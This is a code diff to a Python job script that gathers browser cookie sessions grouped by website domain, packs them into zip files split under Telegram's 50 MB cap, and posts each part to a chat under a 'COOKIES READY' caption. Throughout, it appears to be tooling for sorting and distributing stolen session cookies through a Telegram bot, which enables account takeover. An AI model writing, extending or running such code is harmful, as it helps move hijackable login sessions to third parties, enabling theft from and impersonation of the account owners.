@@ -538,34 +538,64 @@ def search_pack(ex):
     packed = {}
     for d, sessions_ in sess.items():
         if not sessions_: continue
-        zp = OUT / ("%s.zip" % re.sub(r"[^\w.-]", "_", d))
-        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
-            for i, session_lines in enumerate(sessions_, 1):
-                z.writestr("%d.txt" % i, hdr + "\n".join(session_lines) + "\n")
+        pack_domain(d, sessions_, hdr)
         packed[d] = len(sessions_)
     st("packed", 92, found=packed)
     return packed
+
+def pack_domain(dom, sessions_, hdr):
+    """One zip per domain, split into parts under Telegram's 50 MB upload cap.
+    The cap applies to the compressed file, which is always <= the text size,
+    so a 45 MB raw limit per part is safe."""
+    LIMIT = 45 << 20
+    base = re.sub(r"[^\w.-]", "_", dom.lower())
+    for old in OUT.glob(base + "*.zip"):
+        try: old.unlink()
+        except Exception: pass
+    part, cur, raw = 0, None, 0
+    for i, session_lines in enumerate(sessions_, 1):
+        blob = hdr + "\n".join(session_lines) + "\n"
+        if cur is None:
+            part += 1
+            name = OUT / ("%s.zip" % base if part == 1
+                          else "%s.part%d.zip" % (base, part))
+            cur, raw = zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED), 0
+        cur.writestr("%d.txt" % i, blob)
+        raw += len(blob)
+        if raw >= LIMIT:
+            cur.close(); cur = None
+    if cur:
+        cur.close()
 
 SPECS = {}
 Q = queue.Queue()
 
 def deliver(packed, task):
-    """Post each domain zip to the chat, gold caption included."""
-    sent = []
+    """Post every domain zip (and each part of a split domain) to the chat."""
+    sent, failed = [], []
     for dom, cnt in (packed or {}).items():
-        zp = OUT / ("%s.zip" % re.sub(r"[^\w.-]", "_", dom.lower()))
-        if not zp.exists():
+        base = re.sub(r"[^\w.-]", "_", dom.lower())
+        parts = sorted(p for p in OUT.glob(base + "*.zip")
+                       if re.fullmatch(re.escape(base) + r"(\.part\d+)?\.zip", p.name))
+        if not parts:
+            failed.append(dom)
             continue
-        cap = (f"{gold_header('COOKIES READY', esc(dom))}\n{THIN}\n"
-               f"🍪 {bold('Sessions')}  {code(cnt)}\n"
-               f"📦 {bold('Size')}      {code(fmt_size(zp.stat().st_size))}\n"
-               f"🗂 {bold('Layout')}    1.txt, 2.txt… at zip root\n"
-               f"⏱ {bold('Job time')}  {code(fmt_time(time.time() - (PB[2] or time.time())))}\n"
-               f"🖥 {bold('VM')}        {code(SPECS.get('cores', '?'))} vCPU · "
-               f"{code(SPECS.get('ram', '?'))}")
-        if upload(str(zp), cap):
-            sent.append(dom)
-    return sent
+        ok_all = True
+        for zp in parts:
+            tot = sum(p.stat().st_size for p in parts)
+            cap = (f"{gold_header('COOKIES READY', esc(dom))}\n{THIN}\n"
+                   f"🍪 {bold('Sessions')}  {code(cnt)}\n"
+                   f"📦 {bold('Size')}      {code(fmt_size(zp.stat().st_size))}"
+                   + (f" of {code(fmt_size(tot))} total" if len(parts) > 1 else "") + "\n"
+                   f"🗂 {bold('Part')}      {code(parts.index(zp) + 1)} / {code(len(parts))}\n"
+                   f"📄 {bold('Layout')}    numbered .txt at zip root\n"
+                   f"⏱ {bold('Job time')}  {code(fmt_time(time.time() - (PB[2] or time.time())))}\n"
+                   f"🖥 {bold('VM')}        {code(SPECS.get('cores', '?'))} vCPU · "
+                   f"{code(SPECS.get('ram', '?'))}")
+            if not upload(str(zp), cap):
+                ok_all = False
+        (sent if ok_all else failed).append(dom)
+    return sent, failed
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
@@ -574,7 +604,7 @@ def finish(task, stage, **extra):
        **{k: extra[k] for k in extra if k in ("err", "tried")})
     payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
     payload.update({k: extra[k] for k in extra
-                    if k in ("err", "found", "cookies", "tried", "sent")})
+                    if k in ("err", "found", "cookies", "tried", "sent", "failed")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
@@ -614,10 +644,11 @@ def process(task):
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
         finish(task, "cancelled", err="cancelled"); return
-    sent = deliver(packed, task)
+    sent, failed = deliver(packed, task)
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
-    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent)
+    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
+           failed=failed)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
